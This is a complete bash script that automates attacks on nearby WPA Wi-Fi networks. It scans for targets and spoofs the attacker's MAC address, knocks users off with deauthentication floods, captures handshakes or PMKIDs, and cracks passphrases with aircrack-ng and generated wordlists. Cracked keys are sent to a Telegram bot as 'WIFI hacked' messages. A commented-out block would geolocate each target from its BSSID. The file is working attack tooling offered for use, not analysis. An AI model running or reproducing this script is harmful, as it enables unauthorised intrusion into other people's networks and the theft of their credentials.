#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green
    YW=$(tput setaf 226)  # Yellow
    OR=$(tput setaf 208)  # Orange
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

#╔═╗ VAR ╔════════════════════════════════════╗ START ╔════╗ */
	OST_TARGET="0"
	GHash_FOLDER="GHash$(date "+%T" | tr -d ":")"
	Temp_GHash="/tmp/${GHash_FOLDER}"
	ApiBot=`cat /${USER}/MyScript/setting/telegrambot | grep "api_key" | awk -F ' ' '{print $2}'`
	Chat_id=`cat /${USER}/MyScript/setting/telegrambot | grep "id_chat" | awk -F ' ' '{print $2}'`
#╚═╝ VAR ╚════════════════════════════════════╝  END  ╚════╝ */

#╔══════════════════════════════════════════════╗
#║  Verify the folder of Temporary files
#╚══════════════════════════════════════════════╝
Dir=`ls /tmp | grep -E ^${GHash_FOLDER}$`
if [ "$Dir" != "" ];
	then
		rm -rf ${Temp_GHash}
		mkdir ${Temp_GHash}
	else
		mkdir ${Temp_GHash}
fi
#╚══════════════════════════════  End Function ═╝

#╔══════════════════════════════════════════════╗
#║  Reset hardware MAC
#╚══════════════════════════════════════════════╝
FUNC_Back_macchanger() {
	hash macchanger 2> /dev/null
	BACK_MAC="$?"
	if [ "$BACK_MAC" -eq "0" ]
		then
			ifconfig $INFACE down 2> /dev/null
			macchanger -p $INFACE &> /dev/null
			ifconfig $INFACE up 2> /dev/null
			echo ""
	fi
}
#╚══════════════════════════════  End Reset hardware MAC ═╝

#╔══════════════════════════════════════════════╗
#║  Exit and Clear temp files
#╚══════════════════════════════════════════════╝
FUNC_exit_function() {
	cat /${USER}/MyScript/dic/one/kill.txt | sort -u | uniq > /${USER}/MyScript/dic/one/kill_new.txt
	Size_Old_Pas=$(stat -c%s /${USER}/MyScript/dic/one/kill.txt) # вычисляем размер старого файла
	Size_New_Pas=$(stat -c%s /${USER}/MyScript/dic/one/kill_new.txt) # вычисляем размер нового файла
	if [[ "$Size_Old_Pas" -lt "$Size_New_Pas" ]];
		then
			rm /${USER}/MyScript/dic/one/kill.txt
			mv /${USER}/MyScript/dic/one/kill_new.txt /${USER}/MyScript/dic/one/kill.txt
		else
		if [[ "$Size_Old_Pas" -ne 0 ]];
			then
				rm /${USER}/MyScript/dic/one/kill_new.txt
		fi
	fi
	OST_TARGET=$(($OST_TARGET*2+1))
	rc_dw_tr="\e[${OST_TARGET}B"
	echo -e "${NRC}${rc_dw_tr}"
	# echo -e "${NRC}${DWC}${DWC}${DWC}"
	echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] Reset to original hardware MAC."
	FUNC_Back_macchanger
	echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] Remove temporary file ."
	rm -rf ${Temp_GHash}
	sleep 1
	echo ""
	exit
}
#╚══════════════════════════════  End Exit and Clear temp files ═╝

#╔══════════════════════════════════════════════╗
#║  Function
#╚══════════════════════════════════════════════╝
FUNC_Found_Hash () {
	Dir_Point=`ls /${USER}/MyOUTPUT/wifi/handshake | grep ${BSSID}`
	if [ "$Dir_Point" == "" ];
		then
			mkdir /${USER}/MyOUTPUT/wifi/handshake/${BSSID}
	fi
	Dir_Point2=`ls /${USER}/MyOUTPUT/wifi/handshake/${BSSID} | grep ${ESSID}`
	if [ "$Dir_Point2" == "" ];
		then
			mkdir /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}
	fi
	cp ${Temp_GHash}/${BSSID}-01.cap /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/
	kill -9 $Airodump_PID 2> /dev/null
}
#╚══════════════════════════════  End Function ═╝

#╔══════════════════════════════════════════════╗
#║  Find all passwords file
#╚══════════════════════════════════════════════╝
FUNC_select_to_crack() {
	cat /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt | awk -F "," '{print $4}'| sed 's/^ //g' | sort -u >> ${Temp_GHash}/passwords.txt
	find /${USER}/MyScript/dic/one -name '*.txt' -size -25M | sort -k3 | nl -s") " | sed -n -e "$num"p | grep -o '/.*' > ${Temp_GHash}/passwords_list.txt
	echo -e "${Temp_GHash}/randompasswords.txt" >> ${Temp_GHash}/passwords_list.txt
	sed -i "1i${Temp_GHash}/passwords.txt" ${Temp_GHash}/passwords_list.txt
}
#╚══════════════════════════════  End Find all passwords file ═╝

#╔══════════════════════════════════════════════╗
#║  Create table
#╚══════════════════════════════════════════════╝
FUNC_create_tabl() {
	max_lf=""
	max_rh=""
	S=${#WORD}
	let IZ=${S}%2
	MIN=$((($MAX-$S)/2))
	for (( STIND=0;STIND<${MIN};STIND++))
		do
			max_lf=${max_lf}' '
	done
	if [ $IZ == 0 ]
		then
			for (( STIND=0;STIND<${MIN};STIND++))
				do
					max_rh=${max_rh}' '
			done
		else
			for (( STIND=0;STIND<=${MIN};STIND++))
				do
					max_rh=${max_rh}' '
			done
	fi
}
#╚══════════════════════════════  End Create table ═╝

#╔══════════════════════════════════════════════╗
#║  output % cracking
#╚══════════════════════════════════════════════╝
FUNC_get_procen()
{
	PID_search=$(ps | grep $Aircrack_PID)
	while [[ -n "$PID_search" ]]
		do
			WORK=`tail -n 7 ${Temp_GHash}/tempory.txt 2> /dev/null | grep -a -o "[0-9]*\.[0-9]*\%" | tail -1 2> /dev/null`
			if [ -n "$WORK" -a "$WORK" != "$SU" ];
				then
					SU=$WORK
					WORD="${BD}${WH}Cracking ${BD}${CY}${T}${NM}${YW}/${BD}${CY}${K} ${NM}${PR}> ${BD}${YW}${SU}% "
					rc_rh_tr="\e[4C"
					printf "\r ${RSC}${rc_rh_tr}${WORD}"
			fi
			PID_search=$(ps | grep $Aircrack_PID)
			if [[ -n "$PID_search" ]];
				then
					FOUND_key=$(tail -n 3 ${Temp_GHash}/tempory.txt | grep -o 'FOUND.*\[.*\]' | sort -u | awk '{print $3}')
				else
					echo -e "" 2>/dev/null
			fi
	done
	if [[ -n "$FOUND_key" ]];
		then
			KEY=$FOUND_key
		else
			echo -e "" 2>/dev/null
	fi
}
#╚══════════════════════════════  End output % cracking ═╝

#╔══════════════════════════════════════════════╗
#║  Kill all functions
#╚══════════════════════════════════════════════╝
FUNC_kill_Airo_function() {
	kill -9 $Airodump_PID 2> /dev/null
	kill -9 $Aircrack_PID 2> /dev/null
	kill -9 $Makepasswd_PID 2> /dev/null
	FUNC_exit_function
}
#╚══════════════════════════════  End Kill all functions ═╝

#╔══════════════════════════════════════════════╗
#║  Create passwords list
#╚══════════════════════════════════════════════╝
FUNC_Create_passlist() {
	PASS1=`echo -e $ESSID`
	PASS2=`echo -e $ESSID | tr '[A-Z]' '[a-z]'`
	PASS3=`echo -e $ESSID | tr -d '[:cntrl:],[:punct:],[:space:]'`
	PASS4=`echo -e $PASS2 | tr -d '[:cntrl:],[:punct:],[:space:]'`
	echo -e ${PASS1} > ${Temp_GHash}/passwords.txt
	echo -e ${PASS2} >> ${Temp_GHash}/passwords.txt
	echo -e ${PASS3} >> ${Temp_GHash}/passwords.txt
	echo -e ${PASS4} >> ${Temp_GHash}/passwords.txt
	while read plus
		do
			echo -e ${PASS1}${plus} >> ${Temp_GHash}/passwords.txt
			echo -e ${PASS2}${plus} >> ${Temp_GHash}/passwords.txt
			echo -e ${PASS3}${plus} >> ${Temp_GHash}/passwords.txt
			echo -e ${PASS4}${plus} >> ${Temp_GHash}/passwords.txt
	done < /${USER}/MyScript/dic/pluspass.txt
	grep ${BSSID} /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt | awk -F "," '{print $4}'| sed 's/^ //g' | sort -u >> ${Temp_GHash}/passwords.txt
}
#╚══════════════════════════════  End Create passwords list ═╝

#╔══════════════════════════════════════════════╗
#║  Aircrack Hash
#╚══════════════════════════════════════════════╝
FUNC_killed() {
	FUNC_Create_passlist
	STARt="Cracking"
	WORD=$STARt
	MAX="30"
	KEY=""
	FUNC_create_tabl
	echo -en "${RSC}${BD}${GR}${max_lf}${STARt}${max_rh}"
	#╔══════════════════════════════════════════════╗
	#║  grep geomap target
	#╚══════════════════════════════════════════════╝
	# MAC=`echo ${BSSID} | sed 's/://g' | sed 's/_//g'`
	# MAC2=`echo ${1} | sed 's/:/-/g'`
	# lat=`curl -i -s -k -X 'POST'  -H 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0.1; Nexus 5 Build/LRX22C)' -H 'Content-Type: application/x-www-form-urlencoded' 'http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks='${MAC}':-65&app=ymetro' | grep -o 'latitude=.*' | sed 's/[^0-9,. ]//g' | awk '{print $1}'`
	# long=`curl -i -s -k -X 'POST'  -H 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0.1; Nexus 5 Build/LRX22C)' -H 'Content-Type: application/x-www-form-urlencoded' 'http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks='${MAC}':-65&app=ymetro' | grep -o 'latitude=.*' | sed 's/[^0-9,. ]//g' | awk '{print $2}'`
	# echo -e "    lat: " ${lat} > /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/adress.txt
	# echo -e "   long: " ${long} >> /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/adress.txt
	# echo -e "    URL: " "https://gps-coordinates.org/my-location.php?lat=${lat}&lng=${long}" >> /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/adress.txt
	#╚══════════════════════════════  End grep geomap target ═╝

	T=0
	K=`cat ${Temp_GHash}/passwords_list.txt | wc -l`
	while read dict
		do
			x=$(aircrack-ng -w $dict /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/${BSSID}-01.cap &> ${Temp_GHash}/tempory.txt) &
			Aircrack_PID="$!"
			disown $Aircrack_PID
			T=$(($T+1))
			FUNC_get_procen
			# KEY=$(aircrack-ng -w $dict /${USER}/MyOUTPUT/wifi/handshake/${BSSID}/${ESSID}/${BSSID}-01.cap | grep -o 'FOUND.*\[.*\]' | sort -u | awk '{print $3}')
			if [[ -n "$KEY" ]];
				then
					WORD=$KEY
					FUNC_create_tabl
					echo -en "${RSC}${BD}${GR}${max_lf}${KEY}${max_rh}"
					ITDATE=`date +%d-%m-%Y`
					echo -e " $ITDATE, $ESSID, $BSSID, $KEY," >> /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt
					echo -e $KEY >> /${USER}/MyScript/dic/one/kill.txt
					if [[ -n ${ApiBot} && -n ${Chat_id} ]]
						then
							MSGBOT="WIFI hacked -> ${ESSID} : ${KEY}"
							SENDTOBOT=`curl -s "https://api.telegram.org/${ApiBot}/sendMessage?chat_id=${Chat_id}&text=${MSGBOT}" &>/dev/null`
					fi		
					break
				else
					echo "" &> /dev/null
			fi
	done < ${Temp_GHash}/passwords_list.txt
	if [[ -n "$KEY" ]];
		then
			echo "" &> /dev/null
		else
			WORD="Not found!"
			FUNC_create_tabl
			echo -en "${RSC}${BD}${RD}${max_lf}${WORD}${max_rh}"
	fi
	# fi
}
#╚══════════════════════════════  End Aircrack Hash ═╝

#╔══════════════════════════════════════════════╗
#║  Capch handshake
#╚══════════════════════════════════════════════╝
FUNC_WPA_function() {
	ERRCHANEL=`aireplay-ng $INFACE -l 2 -a $BSSID | grep "is on channel"`
	if [[ -n "$ERRCHANEL" ]];
		then
			CHANNEL=`aireplay-ng $INFACE -l 2 -a $BSSID | grep -o 'uses channel.*' | awk '{print $3}'`
			iw dev $INFACE set channel $CHANNEL 2> /dev/null
		else
			echo "" 2> /dev/null
	fi
	file_cap=""
	xterm -T "DUMP ${BSSID}" -geometry 140x30m -e airodump-ng -c $CHANNEL --bssid $BSSID -w ${Temp_GHash}/${BSSID} --output-format csv,pcap $INFACE &> /dev/null &
	Airodump_PID="$!"
	disown $Airodump_PID
	if [[ -n "Airodump_PID" ]];
		then
			echo -en "${RSC}${BD}${RD}Start attack."
			Hash_found=""
			NUM_LS=0
			while [[ -z "${file_cap}" ]];
				do
					file_cap=`ls ${Temp_GHash}/ | grep ${BSSID}-01.cap 2> /dev/null`
					NUM_LS=$(($NUM_LS+1))
					if [[ "$NUM_LS" -eq "10" ]];
						then
							break 1
					fi
					sleep 1
			done
			if [[ -n "${file_cap}" ]];
				then
					sleep 15
					ESSID=`aircrack-ng ${Temp_GHash}/${BSSID}-01.cap | grep WPA | awk '{print $3}' 2> /dev/null`
					if [ "$ESSID" == "" -o "$ESSID" == "WPA" ];then
						ESSID='unknown'
					fi
					x=47
					rc_rh_tr="\e[${x}C"
					echo -en "${RSC}${rc_rh_tr}${NM}${BL}>> ${BD}${CY}$ESSID"
					NUM_check=0
					VAR=0
					while [[ "$VAR" -eq "0" ]];
						do
							echo -en "${RSC}${NM}${OR} DUMP HASH.. "
							sleep 8
							NUM_check=$(($NUM_check+1))
							Hash=`aircrack-ng ${Temp_GHash}/${BSSID}-01.cap | tee ${Temp_GHash}/aircrack-ng_rslt.txt 2> /dev/null`
							Aircrack_PID="$!"
							# disown $Aircrack_PID
							File_ng_rslt=`ls ${Temp_GHash} | grep -E 'aircrack-ng_rslt'`
							if [ "$File_ng_rslt" == "" ];
								then
									echo -en "" 2> /dev/null
								else
									Hash_found=`cat ${Temp_GHash}/aircrack-ng_rslt.txt | grep '1 handshake' 2> /dev/null`
									PMKID_found=`cat ${Temp_GHash}/aircrack-ng_rslt.txt | grep 'WPA (0 handshake, with PMKID)' 2> /dev/null`
									if [[ -n "$Hash_found" || -n "$PMKID_found" ]];
										then
											TEST1=`cowpatty -c -r ${Temp_GHash}/${BSSID}-01.cap | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase"`
											if [[ -n "$TEST1" ]];
												then
													if [[ "$ESSID" == "unknown" ]];
														then
															timeout 3s mdk3 $INFACE d -c $CHANNEL &> /dev/null &
														else
															timeout 3s aireplay-ng $INFACE -0 5 -a $BSSID &> /dev/null &
													fi
													sleep 10
													if [[ -n "$Hash_found" ]];
														then
															echo -en "${RSC}${BD}${YW} HASH FOUND. "
														else
															echo -en "${RSC}${BD}${YW} PMKID FOUND "
													fi
													Num_targets=$(($Num_targets-1))
													OST_TARGET=$Num_targets
													FUNC_Found_Hash
													sed -i "s/${BSSID}.*/${BSSID} ${ESSID} 1/" ${Temp_GHash}/ch.txt
													VAR=1
												else
													if [[ "$NUM_check" -eq "6" ]];
														then
															kill -9 $Aircrack_PID 2> /dev/null
															kill -9 $Airodump_PID 2> /dev/null
															echo -en "${RSC}${NM}${RD}  BAD HASH   "
															Num_targets=$(($Num_targets-1))
															OST_TARGET=$OST_TARGET
															sed -i "s/${BSSID}.*/${BSSID} ${ESSID} 0/" ${Temp_GHash}/ch.txt
															break 1
													fi
											fi
										else
											if [[ "$NUM_check" -eq "6" ]];
												then
													kill -9 $Aircrack_PID 2>/dev/null
													kill -9 $Airodump_PID 2> /dev/null
													echo -en "${RSC}${NM}${RD}   NO HASH   "
													Num_targets=$(($Num_targets-1))
													OST_TARGET=$Num_targets
													sed -i "s/${BSSID}.*/${BSSID} ${ESSID} 0/" ${Temp_GHash}/ch.txt
													break 1
											fi
											if [[ "$ESSID" == "unknown" ]];
												then
													timeout 5s mdk3 $INFACE d -c $CHANNEL &> /dev/null &
												else
													timeout 5s aireplay-ng $INFACE -0 5 -a $BSSID &> /dev/null &
											fi
											echo -en "${RSC}${BD}${RD} DEATCH USER "
											sleep 5
									fi
							fi
					done
			fi
		else
			if [[ "$TMP_ATTEMPT" -eq "3" ]];
				then
					echo -en "${RSC}${BD}${RD}    ERROR    "
			fi
			kill -9 $Airodump_PID 2>/dev/null
			kill -9 $Aircrack_PID 2>/dev/null
			TMP_ATTEMPT=$(($TMP_ATTEMPT*1+1))
			echo -en "${RSC}${BD}${RD}  ATTEMPT $TMP_ATTEMPT  "
			FUNC_WPA_function
	fi
}
#╚══════════════════════════════  End Capch handshake ═╝

#╔══════════════════════════════════════════════╗
#║  Searche targets
#╚══════════════════════════════════════════════╝
FUNC_dump()
{
	echo -e ""
	echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Ignore found targets? [${NM}${WH}${NM}${RD}Y${NM}${CY}/${NM}${WH}n${NM}] ${BD}${CY}> ${BD}${RD}"
	read IGNORE
	if [ "$IGNORE" == "Y" -o -z "$IGNORE" ];
		then
			cat /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt | grep -E -a -o '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}' | sort -u > ${Temp_GHash}/ignore_list.txt
		else
			echo -en "" > ${Temp_GHash}/ignore_list.txt
	fi
	clear
	echo -e ""
	echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Enter search time [${NM}${WH}>10s${NM}] ${BD}${CY}> ${BD}${RD}"
	read itm
	if [[ -n "$itm" ]];
		then
			if [[ "$itm" -gt 10 ]];
				then
					tm="$itm"
				else
					tm=45
			fi
		else
			tm=45
	fi
	clear
	timeout $tm airodump-ng --manufacturer -w ${Temp_GHash}/dump --output-format csv $INFACE &> /dev/null &
	Airodump_PID="$!"
	disown $Airodump_PID
}
#╚══════════════════════════════  End Searche targets ═╝

#╔══════════════════════════════════════════════╗
#║  MacChanger and table targets
#╚══════════════════════════════════════════════╝
FUNC_grepmac() {
	a=`grep -E -a -o ', [0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5},' ${Temp_GHash}/dump-01.csv | grep -E -a -o '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}'`
	echo "$a" > ${Temp_GHash}/list.txt
	cat ${Temp_GHash}/list.txt | sort | uniq > ${Temp_GHash}/list2.txt
	rm ${Temp_GHash}/list.txt
	mv ${Temp_GHash}/list2.txt ${Temp_GHash}/list.txt
	while read ignore_target
		do
			sed -i "/${ignore_target}/d" ${Temp_GHash}/list.txt
	done < ${Temp_GHash}/ignore_list.txt
	echo ""
	echo -e "${NM}${WH}  +${NM}${CY}--------------------------${NM}${WH}+"
	echo -e "${NM}${CY}  |${NM}${WH} [${NM}${RD}+${NM}${WH}]${NM}${YW} Change MAC adress${NM}${CY}    |"
	echo -e "${NM}${WH}  +${NM}${CY}--------------------------${NM}${WH}+${NM}${CY}--------------------${NM}${WH}>"
	hash macchanger 2> /dev/null
	Ver_Macchanger="$?"
	if [ "$Ver_Macchanger" -eq "0" ]
		then
			echo -e "${NM}${RD}${NM}${CY}  | >>${NM}${WH} Macchanger${NM}${WH} :"
			ifconfig $INFACE down 2> /dev/null
			macchanger -r $INFACE 2> /dev/null > ${Temp_GHash}/MAC.txt
			ifconfig $INFACE up 2> /dev/null
			Current_MAC=`cat ${Temp_GHash}/MAC.txt 2> /dev/null | grep "Current MAC" | awk '{print $3}'`
			Permanent_MAC=`cat ${Temp_GHash}/MAC.txt 2> /dev/null | grep "Permanent MAC" | awk '{print $3}'`
			Type_Of_WC=`cat ${Temp_GHash}/MAC.txt 2> /dev/null | grep "Permanent MAC" | cut -d" " -f4-`
			New_MAC=`cat ${Temp_GHash}/MAC.txt 2> /dev/null | grep "New MAC" | awk '{print $3}'`
			echo -e "${NM}${CY}  |    ${NM}${GR}>>${NM}${WH} Interface  ${NM}${WH}   : ${BD}${RD}${INFACE} ${NM}${WH}"
			echo -e "${NM}${CY}  |    ${NM}${GR}>>${NM}${WH} Current MAC${NM}${WH}   : ${NM}${WH}${Current_MAC} ${NM}${WH}."
			echo -e "${NM}${CY}  |    ${NM}${GR}>>${NM}${YW} Permanent MAC${NM}${WH} : ${NM}${YW}${Permanent_MAC} ${NM}${WH}${Type_Of_WC} ."
			echo -e "${NM}${CY}  |    ${NM}${GR}>>${NM} New MAC${NM}${WH}       : ${NM}${New_MAC} ${NM}${WH}."
			echo -e "${NM}${WH}  +${NM}${CY}-----------------------------------------------${NM}${WH}>"
			echo ""
	fi

	Num_targets=`cat ${Temp_GHash}/list.txt 2> /dev/null | wc -l`
	OST_TARGET=$Num_targets
	ID_target="1"
	echo -e "${NM}${WH}  +${NM}${CY}--------------------------${NM}${WH}+"
	if [[ "$Num_targets" -lt 10 ]];
		then
			echo -e "${NM}${CY}  |${NM}${WH} [${NM}${RD}+${NM}${WH}]${NM}${YW} Found targets ${NM}${GR}>  ${BD}${RD}$Num_targets${NM}${CY}   |             ${NM}${PR}-= ${BD}${YW}Aircrack Attack ${NM}${PR}=-          "
		else
			echo -e "${NM}${CY}  |${NM}${WH} [${NM}${RD}+${NM}${WH}]${NM}${YW} Found targets ${NM}${GR}>  ${BD}${RD}$Num_targets${NM}${CY}  |             ${NM}${PR}-= ${BD}${YW}Aircrack Attack ${NM}${PR}=-          "
	fi
	echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
	echo -e "${NM}${CY}  |${BD}${RD} ID ${NM}${CY}|        ${BBlue}BSSID        ${NM}${CY}|      ${BPurple}HASH      ${NM}${CY}|          ${BD}${WH}PASSWORDS           ${NM}${CY}|"
	echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
	while read line
		do
			if [[ "$ID_target" -lt 10 ]];
				then
					echo -e "${NM}${CY}  |${NM}${RD} 0$ID_target ${NM}${CY}|  ${NM}$line  ${NM}${CY}|      ${NM}${PR}Wait..    ${NM}${CY}|              ${NM}${WH}NO              ${NM}${CY}|"
				else
					echo -e "${NM}${CY}  |${NM}${RD} $ID_target ${NM}${CY}|  ${NM}$line  ${NM}${CY}|      ${NM}${PR}Wait..    ${NM}${CY}|              ${NM}${WH}NO              ${NM}${CY}|"
			fi
			echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
			ID_target=$(($ID_target+1))
			b=`grep -n "^$line" ${Temp_GHash}/dump-01.csv | grep -E -a -o ' [1-9]{1,2},' | grep -E -a -o '[1-9]{1,2}' | head -n 1`
			echo "$line $b" >> ${Temp_GHash}/ch.txt
	done < ${Temp_GHash}/list.txt
	echo ""
	cat ${Temp_GHash}/ch.txt | sort | uniq > ${Temp_GHash}/ch2.txt
	rm ${Temp_GHash}/ch.txt
	mv ${Temp_GHash}/ch2.txt ${Temp_GHash}/ch.txt
}
#╚══════════════════════════════  End MacChanger and table targets ═╝

#╔══════════════════════════════════════════════╗
#║  Atatck all targets
#╚══════════════════════════════════════════════╝
FUNC_get() {
	OST_TARGET=$OST_TARGET
	i=$(($Num_targets*2+1))
	j=$(($Num_targets*2+1))
	x=32
	y=15
	TMP_ATTEMPT=0
	rc_up_tr="\e[${i}A"
	rc_dw_tr="\e[${j}B"
	rc_rh_tr="\e[${x}C"
	rc_lf_tr="\e[${y}D"
	echo -en "${NRC}${rc_up_tr}${rc_rh_tr}${SVC}${BD}${RD} Starting..."
	while read BSSID CHANNEL
		do
			FUNC_WPA_function
			if [[ "$Num_targets" -eq "0" ]]
				then
					break
			fi
			i=2
			j=2
			x=32
			y=15
			rc_up_tr="\e[${i}A"
			rc_dw_tr="\e[${j}B"
			rc_rh_tr="\e[${x}C"
			rc_lf_tr="\e[${y}D"
			echo -en "${RSC}${rc_dw_tr}${SVC}"
	done < ${Temp_GHash}/ch.txt
}

FUNC_All_crack() {
	Num_targets=`cat ${Temp_GHash}/list.txt 2> /dev/null | wc -l`
	i=$(($Num_targets*2-2))
	rc_up_tr="\e[${i}A"
	r=16
	rh_tr="\e[${r}C"
	STARt=""
	WORD=$STARt
	MAX="30"
	FUNC_create_tabl
	if [[ "$Num_targets" -gt "1" ]]
		then
			echo -en "${RSC}${rc_up_tr}${rh_tr}${LFC}${SVC}"
		else
			echo -en "${RSC}${rh_tr}${LFC}${SVC}"
	fi
	while read BSSID ESSID ONHASH
		do
			if [[ -n "$ONHASH" ]]
				then
					if [[ "$ONHASH" -eq 1 ]]
						then
							Num_targets=$(($Num_targets-1))
							OST_TARGET=$Num_targets
							FUNC_killed
					fi
			fi
			j=2
			rc_dw_tr="\e[${j}B"
			echo -en "${RSC}${rc_dw_tr}${SVC}"
	done < ${Temp_GHash}/ch.txt
}
#╚══════════════════════════════  End Atatck all targets ═╝

#╔══════════════════════════════════════════════╗
#║  Install makepasswd
#╚══════════════════════════════════════════════╝
FUNC_set_makepasswd()
{
	clear
	echo -e ""
	echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Specify the number of generated passwords [${NM}${RD}500000${NM}${CY}/${NM}${WH}n${NM}] ${BD}${CY}> ${BD}${RD}"
	read GENPASS
	if [[ -n "$GENPASS" && "$GENPASS" -gt "1" ]];
		then
			GENPASS=$GENPASS
		else
			GENPASS="500000"
	fi
	clear
	inf=`dpkg -s makepasswd | grep -w "Status: install ok installed"`
	if [[ -z "$inf" ]];
		then
			installed=`apt-get install makepasswd 2> /dev/null`
		else
			echo -e ""
	fi
	makepasswd -count ${GENPASS} > ${Temp_GHash}/randompasswords.txt &
	Makepasswd_PID="$!"
	disown $Makepasswd_PID
}
#╚══════════════════════════════  End Install makepasswd ═╝

trap FUNC_kill_Airo_function SIGINT
echo ""
FUNC_set_makepasswd
INFACE_SET=`iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}'`
if [[ -z "$INFACE_SET" ]]
	then
		IMANAGED=`iwconfig 2>/dev/null | grep 'Mode:Managed' -B 1 | grep -Ev 'Mode:Managed' | awk '{print $1}'`
		if [[ -n "$IMANAGED" ]]
			then
				airmon-ng start $IMANAGED &>/dev/null
		fi
fi
clear
INFACENUM=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | wc -l`
if [[ "$INFACENUM" -gt 1 ]];
	then
		echo -e " ${NM}${PR}╔════════════════════════╗"
		echo -e " ${NM}${PR}║    ${BD}${YW}SELECT INTERFACE    ${NM}${PR}║"
		echo -e " ${NM}${PR}╚════════════════════════╝"
		echo -en "${BD}${WH}"
		iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' 2>/dev/null
		echo -e " ${NM}${PR}╚════════════════════════╝"
		echo -en " ${SVC}${NM}Enter NUM ${Res}${BD}${CY}> ${BD}${RD}"
		read NUM
		INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' | grep $NUM | awk '{print $2}'`
		clear
	else
		INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'`
fi
if [[ -n "$INFACE" ]];
	then
		FUNC_dump
		clear
		echo -en "${NRC}${DWC}${RGC}${RGC}${SVC} "
		while [[ "$tm" -ne 0 ]];
			do
				if [[ "$tm" -lt 10 ]];
					then
						echo -en "${RSC}${NM}${WH}[${NM}${RD}!${NM}${WH}] ${BD}${GR}Search targets for attack ... ${BD}${RD} 0$tm"
					else
						echo -en "${RSC}${NM}${WH}[${NM}${RD}!${NM}${WH}] ${BD}${GR}Search targets for attack ... ${BD}${RD} $tm"
				fi
				tm=$(($tm-1))
				sleep 1
				if [[ "$tm" -eq "0" ]];
					then
						echo -e "${NRC}"
						result_dump=`grep -E -a -o ', [0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5},' ${Temp_GHash}/dump-01.csv | grep -E -a -o '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}'`
					if [[ -n "$result_dump" ]];
						then
							clear
							FUNC_select_to_crack
							FUNC_grepmac
							FUNC_get
							FUNC_All_crack
							FUNC_kill_Airo_function
						else
							rm ${Temp_GHash}/dump-01.csv
							clear
							echo -e ""
							echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Clients${NM}${RD} Not Found${NM}${WH} ."
							sleep 2s
							clear
							FUNC_dump
					fi
				fi
		done
	else
		clear
		echo -e ""
		echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Wireless Card${NM}${RD} Not Found${NM}${WH} ."
		FUNC_exit_function
fi